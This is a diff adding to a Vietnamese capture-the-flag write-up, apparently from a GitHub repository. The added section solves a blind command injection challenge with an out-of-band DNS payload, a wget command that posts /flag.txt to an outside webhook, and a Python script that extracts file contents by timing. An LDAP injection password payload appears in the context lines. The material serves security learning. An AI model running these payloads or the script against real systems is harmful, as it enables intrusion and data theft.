@@ -208,3 +208,33 @@ Tiếp cái password: (!(&(1=0)(userPassword=foobar)). Ta phân tích như sau: 
 5. File .passwd chứa flag.
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b407ebdb-e648-4e82-99a9-bb800837d384)
 
+## Blind Command Injection
+
+1. Ở bài này có hint là thử các gửi request với method OPTIONS. Khi đó nhận được request cho biết 3 method được cho phép là GET, HEAD, OPTIONS.
+2. Thử gửi payload oob với method HEAD `nslookup ``whoami``.BURP-COLL`. Nhận thấy thành công.
+3. Như vậy ta sẽ gửi file `/flag.txt` vào host do ta kiểm soát. Ở đây ta dùng webhook. `wget --post-file="/flag.txt" https://eonnlyuk1evzal4.m.pipedream.net`
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b8c0aa5b-dde7-49c2-8d19-dadfcf999a72)
+4. Host nhận được file flag.txt chứa flag.
+
+### Cách thứ 2: là exploit bằng time-based
+```
+import requests
+
+CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789}{._-/"
+
+URL = "http://13.215.248.36:32162"
+
+FLAG=""
+for i in range(1,70):
+    for c in CHARSET:
+        INJECT='if [ "cat /*.txt | head -n 1 | cut -c {}" = "{}" ]; then sleep 5; else sleep 0; fi;'.format(i,c);
+        r = requests.head(URL, params={"cmd":INJECT})
+        response_time=r.elapsed.total_seconds()
+        print("Trying index: ",i,"->",c," (time:",response_time,")",end="\r")
+        if(response_time>5):
+            FLAG+=c
+            print("Found: ",c,"--> FLAG:",FLAG)
+            break;
+```
+
+## 
